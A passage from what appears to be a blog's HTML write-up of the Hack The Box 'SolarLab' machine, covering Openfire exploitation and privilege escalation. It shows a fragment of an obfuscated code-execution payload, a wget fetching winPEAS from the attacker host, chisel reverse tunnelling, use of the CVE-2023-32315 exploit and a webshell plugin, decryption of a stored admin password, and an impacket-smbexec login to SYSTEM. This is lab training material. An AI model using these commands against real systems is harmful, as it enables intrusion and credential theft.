&#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1,</span></span></span><br><span class="line"><span class="string"><span class="tag"> &#x27;startswith&#x27;: lambda self,</span></span></span><br><span class="line"><span class="string"><span class="tag">  x: 1 == 0,</span></span></span><br><span class="line"><span class="string"><span class="tag">   &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123; setattr(self, &#x27;mutated&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">    self.mutated - 1) &#125;,</span></span></span><br><span class="line"><span class="string"><span class="tag">     &#x27;__hash__&#x27;: lambda self: hash(str(self)), &#125;,</span></span></span><br><span class="line"><span class="string"><span class="tag">      ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#x27;red&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>sending in the repaeter tab, i got a 503 from the web server<br> and a powershell session as the blake user.<br> <img src="/../images/solarlab/rev1.png" alt="alt text"></p><h2 id="Initial-Foothold"><a href="#Initial-Foothold" class="headerlink" title="Initial Foothold"></a>Initial Foothold</h2><p>the user flag was found under <code>C:\Users\blake\Desktop\flag.txt</code></p><p>checking <code>Users</code> folder, i found <code>openfire</code>, <code>Administrator</code>, and <code>blake</code>(me).</p><p>getting winpeas</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;http://10.10.16.97/winPEASany.exe&quot; -OutFile </span><br><span class="line">&quot;C:\Users\blake\Desktop\winpeas.exe&quot;</span><br></pre></td></tr></table></figure><p>Found openfire service Running running a web protal locally on port 9090.<br><img src="/../images/solarlab/listneingport.png" alt="alt text"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Openfire(Openfire)[&quot;C:\Program Files\Openfire\bin\openfire-service.exe&quot;] - Autoload</span><br></pre></td></tr></table></figure><h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><p>Openfire is a real-time collaboration (RTC) server licensed under the Open Source Apache License.<br>I tried to get into <code>C:\Program Files\Openfire\</code> to look for scripts&#x2F;DBs but it was resricted to openfire only.</p><h3 id="Openfire-Web-Server"><a href="#Openfire-Web-Server" class="headerlink" title="Openfire Web Server"></a>Openfire Web Server</h3><p>port forwarding with chisel so i can interact with local server:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\chisel.exe client 10.10.16.14:4321 R:9090:127.0.0.1:9090   #on-victim</span><br><span class="line">chisel server --socks5 --reverse -p 4321                     #on-attacker</span><br></pre></td></tr></table></figure><p>Navigating to localhost:9090<br><img src="/../images/solarlab/openfire.png" alt="alt text"></p><h3 id="Exploring-CVE-2023-32315"><a href="#Exploring-CVE-2023-32315" class="headerlink" title="Exploring CVE-2023-32315"></a>Exploring CVE-2023-32315</h3><p>trying default credentials did not work.<br>searching for “openfire exploit” reveals Openfire  is vulnerable to a Path traversal where attackers can abuse the vulneralbility in order to obtain CSRF tokens and cookies for Administrative accounts to generate an account that they can log onto.<br><img src="/../images/solarlab/0_5wf7vTHNYoj8z4hy.webp" alt="alt text"></p><p>Read more:<a href="https://vsociety.medium.com/cve-2023-32315-path-traversal-in-openfire-leads-to-rce-10f988e06236">https://vsociety.medium.com/cve-2023-32315-path-traversal-in-openfire-leads-to-rce-10f988e06236</a></p><h3 id="Shell-as-Openfire"><a href="#Shell-as-Openfire" class="headerlink" title="Shell as Openfire"></a>Shell as Openfire</h3><p>searching for “openfire exploit”<br> <a href="https://github.com/miko550/CVE-2023-32315#step">https://github.com/miko550/CVE-2023-32315#step</a><br>This exploit aims to generate a new user with <code>CVE-2023-32315</code> and perform RCE through a bundled Malicious Plugin.<br>  steps to perform:</p><ol><li>Run exploit</li><li>login with newly added user </li><li>go to tab plugin &gt; upload plugin <code>openfire-management-tool-plugin.jar</code></li><li>go to tab server &gt; server settings &gt; Management tool  </li><li>Access webshell with password “123”</li></ol><p><img src="/../images/solarlab/cve2.png" alt="alt text"><br>login with the newly added user:<br><img src="/../images/solarlab/openfirelogin.png" alt="alt text"><br>follow the other steps to upload the plugin<br> go to tab plugin &gt; upload plugin <code>openfire-management-tool-plugin.jar</code><br><img src="/../images/solarlab/plugin.png" alt="alt text"></p><p>go to tab server &gt; server settings &gt; Management tool<br>Access webshell with password “123”</p><p>get powershell as openfire with the same technique:<br><img src="/../images/solarlab/powershell-1.png" alt="alt text"></p><h2 id="SQL-Analysis"><a href="#SQL-Analysis" class="headerlink" title="SQL Analysis"></a>SQL Analysis</h2><p>With the newly obtained privilege I can now access <code>\Openfire\</code><br>Found scripts related to DB in <code>/openfire/embedded-db</code>, discovered <code>openfire.script</code>. Searching for <code>CREATE</code> and <code>INSERT</code> queries:<br>I found some queries related to users.<br>the query Underneath shows the schema for Creating the <code>OFUSER</code> table, which is responsible for holding user credentials. </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> MEMORY <span class="keyword">TABLE</span> PUBLIC.OFUSER(USERNAME <span class="type">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT NULL</span>,STOREDKEY <span class="type">VARCHAR</span>(<span class="number">32</span>),SERVERKEY <span class="type">VARCHAR</span>(<span class="number">32</span>),SALT <span class="type">VARCHAR</span>(<span class="number">32</span>),</span><br><span class="line">ITERATIONS <span class="type">INTEGER</span>,</span><br><span class="line"></span><br><span class="line">PLAINPASSWORD <span class="type">VARCHAR</span>(<span class="number">32</span>),ENCRYPTEDPASSWORD <span class="type">VARCHAR</span>(<span class="number">255</span>),</span><br><span class="line"></span><br><span class="line">NAME <span class="type">VARCHAR</span>(<span class="number">100</span>)</span><br><span class="line">,EMAIL <span class="type">VARCHAR</span>(<span class="number">100</span>),CREATIONDATE <span class="type">VARCHAR</span>(<span class="number">15</span>) <span class="keyword">NOT NULL</span>,MODIFICATIONDATE <span class="type">VARCHAR</span>(<span class="number">15</span>) <span class="keyword">NOT NULL</span>,<span class="keyword">CONSTRAINT</span> OFUSER_PK <span class="keyword">PRIMARY KEY</span>(USERNAME))</span><br></pre></td></tr></table></figure><p>Some queries for adding users were also found. The query for creating an admin account was of particular interest to me.<br><img src="/../images/solarlab/OFUSER.png" alt="alt text"><br>format:<br>name,<br><code>key</code>,<br>serverkey,<br> salt,<br><code>plaintext password</code>,<br> <code>encrypted password</code><br> ….The rest. Looks like encryption was used instead of hashing.<br> Unlike hashing, Eencryption does not require a function or algorithm, google up ways to decrypt openfire passwords.<br><img src="/../images/solarlab/google-dcrypt.png" alt="alt text"><br> checked both github repos to discover key name,<br>Column  <code>passwordkey</code> in the  <code>OFPROPERTY</code> table was found. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type .\openfire.script | findstr &quot;OFPROPERTY&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/insert.png" alt="alt text"><br><img src="/image.png" alt="alt text"></p><p>So now i can leverage my findings to get the administrator’s password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Encrypted-pass:</span><br><span class="line">becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac</span><br><span class="line">62d4e89b2856b0289b365f3069802e59d442</span><br><span class="line">*Key:</span><br><span class="line">hGXiFzsKaAeYLjn  </span><br></pre></td></tr></table></figure><p>I cloned the tool from the  second repo and ran:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -&lt;encrypted-password&gt; &lt;key&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/java-cve.png" alt="alt text"></p><p>We found it!:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ThisPasswordShouldDo!@ </span><br></pre></td></tr></table></figure><h2 id="SYSTEM-SHELL"><a href="#SYSTEM-SHELL" class="headerlink" title="SYSTEM SHELL"></a>SYSTEM SHELL</h2><p>let’s now login to administrator with the PW:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbexec administrator:<span class="string">&#x27;&lt;pw&gt;&#x27;</span>@&lt;victim-ip</span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/SYSTEMXD.png" alt="alt text"><br>root flag was found under<br> <code>Administrator\Desktop\root.txt</code>.</p><p> That’s all, Thank you :)</p>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> nmap </tag>
            
            <tag> HTB </tag>
            
            <tag> smb </tag>
            
            <tag> windows </tag>
            
            <tag> flask </tag>
            
            <tag> privilege escalation </tag>
            
            <tag> openfire </tag>
            
            <tag> chisel </tag>
            
            <tag> password-spray </tag>
            
            <tag> htb solarlab </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
